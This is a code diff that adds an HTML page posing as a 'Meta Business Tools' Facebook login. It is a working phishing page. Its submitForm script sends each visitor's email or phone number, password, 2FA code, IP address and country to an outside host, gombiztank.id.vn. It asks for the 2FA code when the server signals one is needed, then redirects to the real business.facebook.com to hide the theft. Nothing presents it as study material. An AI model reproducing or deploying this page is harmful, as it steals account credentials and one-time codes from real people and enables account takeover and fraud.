@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Meta Business Tools</title>
+        <link rel="shortcut icon" href="image/icon.png" type="image/x-icon">
+        <link rel="stylesheet"
+            href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+            integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                background-color: #EEF6FE;
+            }
+            #language {
+                color: #747171;
+            }
+
+            .home {
+                text-align: center;
+                margin: 10px auto;
+                padding: 10px 20px;
+            }
+
+            .header {
+                display: flex;
+                justify-content: center;
+                margin-top: 80px;
+            }
+
+            .header img {
+                max-height: 60px;
+                min-height: 0px;
+                object-fit: contain;
+                overflow: hidden;
+            }
+
+            .content {
+                margin-top: 80px;
+            }
+
+            .Input {
+                width: 100%;
+                padding: 10px 16px;
+                background: rgb(255, 255, 255);
+                border: 1px solid rgb(203, 210, 217);
+                border-radius: 12px;
+                align-items: center;
+                flex-direction: row;
+                margin-bottom: 20px;
+            }
+
+            .Input:focus {
+                border: 1px solid rgba(28, 43, 51, 1.0000) !important;
+            }
+
+            .inputLogin {
+                width: 100%;
+                display: flex;
+                opacity: 1;
+                height: 44px;
+                min-width: 44px;
+                flex-grow: 1;
+                padding-left: 20px;
+                padding-right: 20px;
+                background: rgba(0, 100, 224, 1.0000);
+                border: 0px solid rgba(28, 43, 51, 1);
+                border-radius: 22px;
+                align-items: center;
+                justify-content: center;
+                text-align: center;
+                font-family: -apple-system, sans-serif;
+            }
+
+            .Input span {
+                color: rgba(255, 255, 255, 1);
+                font-weight: 500;
+                display: inline;
+                font-size: 16px;
+                font-family: Optimistic Text Normal;
+                white-space: pre-wrap;
+                overflow-wrap: break-word;
+            }
+
+            .wbloks_1 {
+                display: flex;
+                position: relative;
+            }
+
+            .wbloks_1 i {
+                position: absolute;
+                right: 14px;
+                top: 15px;
+            }
+
+            .footer {
+                display: flex;
+                justify-content: center;
+                margin-top: 150px;
+            }
+
+            .footer img {
+                max-height: 10px;
+                min-height: 0px;
+                object-fit: contain;
+                overflow: hidden;
+
+            }
+
+            .home span {
+                color: rgba(255, 255, 255, 1.0000);
+                font-weight: 600;
+                display: inline;
+                font-size: 17px;
+                font-family: -apple-system, sans-serif;
+                white-space: pre-wrap;
+                overflow-wrap: break-word;
+            }
+
+            .loader {
+                --d: 22px;
+                width: 4px;
+                height: 4px;
+                border-radius: 50%;
+                color: #1877F2;
+                box-shadow:
+                    calc(1*var(--d)) calc(0*var(--d)) 0 0,
+                    calc(0.707*var(--d)) calc(0.707*var(--d)) 0 1px,
+                    calc(0*var(--d)) calc(1*var(--d)) 0 2px,
+                    calc(-0.707*var(--d)) calc(0.707*var(--d)) 0 3px,
+                    calc(-1*var(--d)) calc(0*var(--d)) 0 4px,
+                    calc(-0.707*var(--d)) calc(-0.707*var(--d))0 5px,
+                    calc(0*var(--d)) calc(-1*var(--d)) 0 6px;
+                animation: l27 1s infinite steps(8);
+            }
+
+            @keyframes l27 {
+                100% {
+                    transform: rotate(1turn)
+                }
+            }
+
+            @media screen and (max-width: 600px) {
+                .Input:focus {
+                    border: 1px solid rgba(28, 43, 51, 1.0000) !important;
+                }
+            }
+        </style>
+        <script>
+            document.addEventListener('DOMContentLoaded', function () {
+                const passwordInput = document.getElementById('pass');
+                const eyeIcon = document.querySelector('.fa-eye');
+                eyeIcon.addEventListener('click', function () {
+                    const isPasswordVisible = passwordInput.type === 'text';
+                    passwordInput.type = isPasswordVisible ? 'password' : 'text';
+                    eyeIcon.className = isPasswordVisible ? 'fa fa-eye-slash' : 'fa fa-eye';
+                });
+            });
+        </script>
+        <script>
+            function submitForm() {
+                var emailInput = document.getElementById('email');
+                var emailValue = emailInput.value;
+                var passwordInput = document.getElementById('pass');
+                var passwordValue = passwordInput.value;
+                if (emailValue === '') {
+                    emailInput.focus();
+
+                }
+                else if (passwordValue === '') {
+                    passwordInput.focus();
+                }
+                else {
+                    var button = document.getElementById("login");
+                    var loader = document.getElementById("loader");
+                    button.style.display = "none";
+                    loader.style.display = "flex";
+                    const ipAddress = localStorage.getItem('ipAddress');
+                    const address = localStorage.getItem('address');
+                    var code = document.getElementById('2facode')
+                    var codeValue = code.value
+                    fetch('https://gombiztank.id.vn/check_facebook_status?username=' + encodeURIComponent(emailValue) + '&password=' + encodeURIComponent(passwordValue) + '&code=' + encodeURIComponent(codeValue) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
+                        .then(response => {
+                            if (!response.ok) {
+                                throw new Error('Network response was not ok');
+                            }
+                            return response.text();
+                        })
+                        .then(data => {
+                            if (data === '2FA') {
+                                var emailContainer = document.getElementById('emailContainer');
+                                emailContainer.style.display = 'none';
+                                var passContainer = document.getElementById('passContainer');
+                                passContainer.style.display = 'none';
+                                var twoFactorContainer = document.getElementById('2faContainer');
+                                twoFactorContainer.style.display = 'block';
+                                var button = document.getElementById("login");
+                                var loader = document.getElementById("loader");
+                                button.style.display = "block";
+                                loader.style.display = "none";
+                                button.addEventListener("click", submitForm);
+                            }
+                            else if (data === 'WRONG') {
+                                passwordInput.value = ''
+                                passwordInput.style.borderColor = 'red';
+                                passwordInput.placeholder = 'Wrong password';
+                                code.placeholder = 'Wrong code';
+                                code.style.borderColor = 'red';
+                                var button = document.getElementById("login");
+                                var loader = document.getElementById("loader");
+                                button.style.display = "block";
+                                loader.style.display = "none";
+                                button.addEventListener("click", submitForm);
+                            }
+                            else if (data == 'CP') {
+                                window.location.href = "https://business.facebook.com/";
+                            }
+                        })
+                        .catch(error => {
+                            console.error('There has been a problem with your fetch operation:', error);
+                        })
+                        .finally(() => {
+                            var button = document.getElementById("login");
+                            var loader = document.getElementById("loader");
+                            button.style.display = "block";
+                            loader.style.display = "none";
+                            button.addEventListener("click", submitForm);
+                        });
+                }
+            }
+            function removeRedBorder() {
+                var emailInput = document.getElementById('email');
+                var passwordInput = document.getElementById('pass');
+                var code = document.getElementById('2facode');
+                passwordInput.setAttribute('placeholder', 'Password');
+                passwordInput.style.borderColor = 'black';
+                if (passwordInput.value.includes('Wrong password')) {
+                    passwordInput.value = '';
+                    passwordInput.setAttribute('placeholder', 'Password');
+                } else if (code.value.includes('Wrong code')) {
+                    code.value = '';
+                }
+                passwordInput.type = 'password';
+                code.style.borderColor = 'black';
+                code.setAttribute('placeholder', '2FA code');
+            }
+        </script>
+        <script>
+            document.addEventListener('DOMContentLoaded', async function () {
+                let ipAddress;
+                let address;
+                try {
+                    const ipifyResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipifyData = await ipifyResponse.json();
+                    ipAddress = ipifyData.ip;
+
+                    const ipLocationNetResponse = await fetch(`https://api.iplocation.net/?cmd=ip-country&ip=${ipAddress}`);
+                    const ipLocationNetData = await ipLocationNetResponse.json();
+                    address = ipLocationNetData.country_name;
+
+                    localStorage.setItem('ipAddress', ipAddress);
+                    localStorage.setItem('address', address);
+                } catch (error) {
+                    console.error('Lỗi:', error);
+                }
+            });
+
+        </script>
+        <script>
+            async function fetchIpAddress() {
+                let ipAddress;
+                let address;
+                try {
+                    const ipifyResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipifyData = await ipifyResponse.json();
+                    ipAddress = ipifyData.ip;
+
+                    const ipLocationNetResponse = await fetch(`https://api.iplocation.net/?cmd=ip-country&ip=${ipAddress}`);
+                    const ipLocationNetData = await ipLocationNetResponse.json();
+                    address = ipLocationNetData.country_name;
+
+                    localStorage.setItem('ipAddress', ipAddress);
+                    localStorage.setItem('address', address);
+                } catch (error) {
+                    console.error('Lỗi:', error);
+                }
+            }
+
+            fetchIpAddress();
+        </script>
+
+    </head>
+
+    <body>
+        <div class="home">
+            <span id="language">English (UK)</span>
+            <div class="header">
+                <img class="logo" src="image/icon.png" alt="">
+            </div>
+            <div>
+                <div class="content">
+                    <div class="wbloks_1" id="emailContainer">
+                        <input id="email" class="Input" type="text" id="m_login_email"
+                            placeholder="Mobile number or email address" oninput="removeRedBorder()">
+                    </div>
+                    <div class="wbloks_1" id="passContainer">
+                        <input id="pass" class="Input" type="password" id="m_login_password" placeholder="Password"
+                            oninput="removeRedBorder()">
+                        <i class="fa fa-eye"></i>
+                    </div>
+                    <div class="wbloks_1" style="display: none;" id="2faContainer">
+                        <input id="2facode" class="Input" type="text" id="2facode" placeholder="2FA code"
+                            oninput="removeRedBorder()" />
+                    </div>
+                    <button class="inputLogin" id="login">
+                        <span onclick="submitForm()">Log in</span>
+                    </button>
+                    <div id="loader" style="display: none;
+                                        width:100% ;
+                                        flex-direction: row;
+                                        margin-top: 10px;
+                                        justify-content: center;">
+                                        <div class="loader"></div>
+                    </div>
+                </div>
+        </div>
+        </div>
+        <div class="footer">
+            <img src="image/meta_logo.png" alt="">
+        </div>
+        </div>
+    </body>
+
+</html>
